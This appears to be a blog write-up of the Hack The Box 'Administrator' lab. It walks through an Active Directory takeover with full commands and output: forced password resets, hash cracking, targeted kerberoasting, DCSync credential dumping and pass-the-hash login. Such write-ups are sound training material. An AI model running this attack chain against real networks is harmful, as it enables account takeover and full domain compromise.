---
layout: post
title: HTB - administrator
date: 2025-01-23 16:18 -0400
---

![img](/assets/img/administrator.png)

## nmap
```bash
~/workspace/projects/htb/administrator » sudo nmap -p- --min-rate 1024 $(cat ip.txt)
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-30 11:05 -04
Nmap scan report for 10.10.11.42
Host is up (0.16s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
62674/tcp open  unknown
65383/tcp open  unknown
65388/tcp open  unknown
65391/tcp open  unknown
65408/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 70.91 seconds
```

## winrm
Will start looking at /priv and Program Files

```bash
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Nothing interesting.

```bash
*Evil-WinRM* PS C:\> ls "Program Files (x86)"


    Directory: C:\Program Files (x86)


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:34 AM                Common Files
d-----         11/1/2024   1:21 PM                Internet Explorer
d-----         10/4/2024  10:19 AM                Microsoft
d-----          5/8/2021   1:34 AM                Microsoft.NET
d-----          5/8/2021   2:35 AM                Windows Defender
d-----         11/1/2024   1:21 PM                Windows Mail
d-----         11/1/2024   1:21 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----          3/2/2022   7:58 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell

*Evil-WinRM* PS C:\> ls "Program Files"


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:50 AM                Common Files
d-----         11/1/2024   1:20 PM                Internet Explorer
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
d-----        10/22/2024  11:51 AM                VMware
d-----         10/5/2024  10:27 AM                Windows Defender
d-----         11/1/2024   1:21 PM                Windows Defender Advanced Threat Protection
d-----         11/1/2024   1:21 PM                Windows Mail
d-----         11/1/2024   1:21 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----          3/2/2022   7:58 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell
```
Nothing interested here also.

## ftp
No access to ftp it seems.

```bash
~/workspace/projects/htb/administrator » netexec ftp $(cat ip.txt) -u Olivia -p 'ichliebedich' --ls .
FTP         10.10.11.42     21     10.10.11.42      [-] Olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)
```

## bloodhound
Will check bloodhound and see if there is something.

Seems like from `olivia` we can access both `michael` and `benjamin` account? Not very familiar with bloodhound yet.

![img](/assets/img/administrator1.png)

Lets check the ldap dump to see if any of those are accounts are interesting.

`ldapdomaindump -u administrator.htb\\Olivia -p 'ichliebedich' $(cat ip.txt) -o ldap/`

benjamin is in the `Share Moderators` group. Looking at smb maybe we can access the `ADMIN$` share?

```bash
~/workspace/projects/htb/administrator » netexec smb $(cat ip.txt) -u Olivia -p 'ichliebedich' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

changing michael password:

```bash
~/workspace/projects/htb/administrator » rpcclient -U "Olivia%ichliebedich" dc.administrator.htb  
rpcclient $> setuserinfo2 michael 23 'Asdf1234$'
```

it works, very cool

```bash
~/workspace/projects/htb/administrator » netexec winrm $(cat ip.txt) -u michael -p 'Asdf1234$'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\michael:Asdf1234$ (Pwn3d!)
```

then just do the same for benjamin

```bash
~/workspace/projects/htb/administrator » rpcclient -U "michael%Asdf1234$" dc.administrator.htb
rpcclient $> setuserinfo2 benjamin 23 Asdf1234$
```

benjamin still can't read `ADMIN$`

```bash
~/workspace/projects/htb/administrator » netexec smb $(cat ip.txt) -u benjamin -p 'Asdf1234$' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:Asdf1234$
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

at least now we have 3 accounts?

## adcs
Next we should check adcs for missconfigured templates

```bash
~/workspace/projects/htb/administrator » certipy find -dc-ip $(cat ip.txt) -ns $(cat ip.txt) -u Olivia@administrator.htb -p 'ichliebedich' -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[-] Got error: socket ssl wrapping error: [Errno 104] Connection reset by peer
[-] Use -debug to print a stacktrace
```

Got an error, not sure what this is about.

## ftp round 2
Seems like benjamin has access to ftp.

```bash
~/workspace/projects/htb/administrator » netexec ftp $(cat ip.txt) -u benjamin -p 'Asdf1234$' --ls .
FTP         10.10.11.42     21     10.10.11.42      [+] benjamin:Asdf1234$
FTP         10.10.11.42     21     10.10.11.42      [*] Directory Listing
FTP         10.10.11.42     21     10.10.11.42      10-05-24  08:13AM                  952 Backup.psafe3
```

.psafe3 file, can we brute force with john the ripper?

```bash
~/workspace/projects/htb/administrator » file Backup.psafe3                                       
Backup.psafe3: Password Safe V3 database
```

It works, just need to convert to the format first.

```bash
~/workspace/projects/htb/administrator » pwsafe2john.py Backup.psafe3 > psafe.dump
~/workspace/projects/htb/administrator » cat psafe.dump                                           
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
~/workspace/projects/htb/administrator » john --wordlist=/home/shafou/wordlists/rockyou.txt psafe.dump
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
tekieromucho     (Backu)
1g 0:00:00:00 DONE (2025-01-23 14:56) 3.226g/s 26425p/s 26425c/s 26425C/s 123456..total90
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We got three more accounts now, alexander, emily, emma.

![img](/assets/img/administrator1.png)

alexander and emma accounts are disabled.

![img](/assets/img/administrator2.png)

emily gives us the user flag.

```bash
~/workspace/projects/htb/administrator » evil-winrm -i $(cat ip.txt) -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cat ..\Desktop\user.txt
bb84e***************************
```

# root
from emily we can get ethan and then to ADMINISTRATOR.HTB

![img](/assets/img/administrator3.png)

bloodhound shows two options to exploit, kerberoasting or shadow creds. Will try the kerberoasting one. [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

```bash
~/workspace/programs/targetedKerberoast (main) » py targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$e28c9a88ead87b6d1464960689313eac$1ac3e1af0dab3b085713da59bfb313d99eb6a662f63cc6191a731e38a050b81650ad18f25a79111d4e6e11213afdf4a6827012a3298836525e84513dc3d33beaf4f00ae4708946cbdc9d42476f5c337e5fcb50c906faac4958b6d61ecd3df43d74184c7590ce3ca1d0b8c4cd29e73a18fbcb3a118d20114917ccb747954c7d808e1f1aecce0a52d9a4a1c87eec3ecc6138dc129c661d5129a5bf03b7aca6d6638bb57a4d5fce55ad02e359e63511b21467b584380a96df77b2e7b46c380fdad5ad9d7ae7e5ade3fb8c7f03fcf6ebe68e1a20ef7d21b7849d3ce6b1ada24da5096c726972720c9720b3e660db047905d22e0a34d65e161bfba16ae42822a7db7057baa320a9a039facf47460cd217d0e89f701c3d86bccc78ab257759abedb8cb4040ba28c0be6e17c32417d7b80aabdad429693a7b484012aa191981eba5688c5a84191f49dae280970a9ff845dcad85b0c7e67c79bd21eda86867d11e4a5f49128d77e1a1f24d9ba334956a3e0c3e0e595326fbb4f3d96ce5e4ce72b52136f43d89057df9a53c16ff6c35ee329398f2571ec6a5fbbc0a3ece4da3879e97bcd9b5b3df6f61d3579362fcaac7966c815396710715ee6133af4625c7861c8b8bd6fa1939d0a14d2ed2b54dbfed213a5f6e40ce38f6ff27a03d48818508f8e29681bfa7ce0b396fb74d8f9ad3549211a6abb20bb730b47f8b5649017119dcc42b7b8f88b64a650261ad3421db82390c53dff4015fb8a0d3650a43aa4d15145bc57db5ec2c48bdad5e8e322f3ccb4362f653d2464f1be2bbea34745b026db39a156003cbed589fa11b335e6f007387ce64ceb28cc266f7e5bd01ea847d9e08ac7963c3f2f7e30b3b29fb9c3152c01076e2b8affe60fd6c6fb25fd43aa090d52363359949e30fbf83f60b7f9ea8693be2c6764e70e28ca11b9686b44ff8d5b9413d81b533da2b60c3514b0ddccacd2a556f2353993f0b6aaa56507a943995aceb4bb0e33a30d27fc60d4e3ea92780d3f53a812ac8256a09986acace7a96a520189b2bf0db8fb04339e2b0f4a00ab8e70ec92d9c6d2454832700b8f61f0f61ffb8a6466218793b6367258cb2d2fb13703a35f9e9c0e6ebb19df0db70cb1cce37eb452c50470f750a8d43a8cb8dad25919529a0cf810822b5ced2277b95859fbd992638dfc5cd004a37121287e2244de76c5faedf7b09c167993189c4048ebb68fc2914e0ca5e8b21c86a71ff6db83962d00ca36d70be014f2617514ff2d31d0d2423afb0f4e50bae845a6ec3bd9514289626866d810dc20fcdf94f3d5e1ce966f47214216eef199707bc2cdfc947c0692680b4e27a07f56dead4cba41a1b9ba3ed71bce00d77025e76b3516ecb7bd26ef460d9ffc329209e47843635635df7120a19bf6c376b61432cf198f2d32954e8873bf5b4cc6e7d1ed7e7d63b01a442c680b068931b9d5e322dcb0b9532b85ddc0204ea7e175608bec5ecb489fa1863d3c3a443a9e8a7d236db0efe6c6d9163f1bafefdaf1a14e6d9522a9fe583a680ce56b1
[VERBOSE] SPN removed successfully for (ethan)
```

Then we just crack the hash
```bash
~/workspace/projects/htb/administrator » /home/shafou/workspace/programs/john/run/john --wordlist=/home/shafou/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
limpbizkit       (?)
1g 0:00:00:00 DONE (2025-01-23 23:10) 20.00g/s 122880p/s 122880c/s 122880C/s newzealand..horoscope
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

For the last step we do a DSync attack:
![img](/assets/img/administrator4.png)

```bash
~/workspace/projects/htb/administrator » secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
...
```

```bash
~/workspace/projects/htb/administrator » evil-winrm -i $(cat ip.txt) -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
73472***************************
```

Bloodhound carries very hard
